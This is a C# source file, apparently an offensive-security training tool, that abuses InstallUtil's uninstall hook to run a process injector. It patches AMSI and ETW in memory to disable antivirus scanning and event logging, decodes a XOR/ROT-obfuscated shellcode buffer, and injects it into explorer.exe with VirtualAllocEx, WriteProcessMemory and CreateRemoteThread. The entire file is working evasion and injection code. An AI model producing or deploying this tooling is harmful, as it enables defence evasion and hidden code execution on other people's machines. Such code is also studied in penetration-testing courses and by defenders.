using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Diagnostics;

namespace OSEP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("OSEP InstallUtil Process Injector (Surgical Edition)");
            Console.WriteLine("Usage: installutil.exe /U <this_exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtilBypass : System.Configuration.Install.Installer
    {
        // --- DELEGATES FOR SURGICAL API CALLS ---
        private delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
        private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        static void StealthInit()
        {
            try {
                IntPtr hAmsi = GetModuleHandle("amsi.dll");
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi != IntPtr.Zero) {
                    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                    uint oldProtect;
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                }
            } catch { }

            try {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                byte[] patch = { 0xC2, 0x14, 0x00 }; // ret 14
                uint oldProtect;
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            } catch { }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            StealthInit();
            Console.WriteLine("[*] Starting Process Injector...");

            // --- SHELLCODE PLACEHOLDERS (Managed by PayloadCompiler.py) ---
            byte[] sc_buf = new byte[] { 0x00 };
            byte sc_xor_key = 0;
            int sc_rot_key = 0;

            if (sc_buf.Length <= 1) {
                Console.WriteLine("[-] Error: No shellcode found. Did you compile with --shellcode?");
                return;
            }

            // --- DECRYPTION (ROT then XOR) ---
            for (int i = 0; i < sc_buf.Length; i++)
            {
                byte decrypted = (byte)(sc_buf[i] ^ sc_xor_key);
                sc_buf[i] = (byte)((decrypted - sc_rot_key + 256) % 256);
            }

            // --- SURGICAL API DISCOVERY ---
            IntPtr k32 = GetModuleHandle("kernel32.dll");
            var oProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(k32, "OpenProcess"), typeof(OpenProcessDelegate));
            var vAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(k32, "VirtualAllocEx"), typeof(VirtualAllocExDelegate));
            var wP_Memory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(k32, "WriteProcessMemory"), typeof(WriteProcessMemoryDelegate));
            var cR_Thread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(k32, "CreateRemoteThread"), typeof(CreateRemoteThreadDelegate));

            // --- FIND TARGET PROCESS (explorer) ---
            int targetPid = 0;
            IntPtr hProcess = IntPtr.Zero;
            Process[] processes = Process.GetProcessesByName("explorer");
            
            Console.WriteLine("[*] Searching for explorer.exe...");
            foreach (Process p in processes)
            {
                // Access Mask: 0x003A (CREATE_THREAD | VM_OPERATION | VM_READ | VM_WRITE)
                hProcess = oProcess(0x003A, false, p.Id);
                if (hProcess != IntPtr.Zero)
                {
                    targetPid = p.Id;
                    Console.WriteLine("[+] Found suitable process: {0} (PID: {1})", p.ProcessName, p.Id);
                    break;
                }
            }

            if (hProcess == IntPtr.Zero) {
                Console.WriteLine("[-] Error: Could not open explorer.exe for injection. Check permissions.");
                return;
            }

            // --- SURGICAL INJECTION ---
            Console.WriteLine("[*] Allocating memory in remote process...");
            IntPtr remoteAddr = vAllocEx(hProcess, IntPtr.Zero, (uint)sc_buf.Length, 0x3000, 0x40);
            if (remoteAddr == IntPtr.Zero) {
                Console.WriteLine("[-] Error: VirtualAllocEx failed.");
                return;
            }
            
            Console.WriteLine("[*] Writing shellcode to remote process...");
            IntPtr bytesWritten;
            if (!wP_Memory(hProcess, remoteAddr, sc_buf, (uint)sc_buf.Length, out bytesWritten)) {
                Console.WriteLine("[-] Error: WriteProcessMemory failed.");
                return;
            }

            Console.WriteLine("[*] Creating remote thread...");
            uint threadId;
            IntPtr hThread = cR_Thread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out threadId);
            
            if (hThread != IntPtr.Zero) {
                Console.WriteLine("[+] Injection successful! Shell should be active.");
            } else {
                Console.WriteLine("[-] Error: CreateRemoteThread failed.");
            }
        }
    }
}
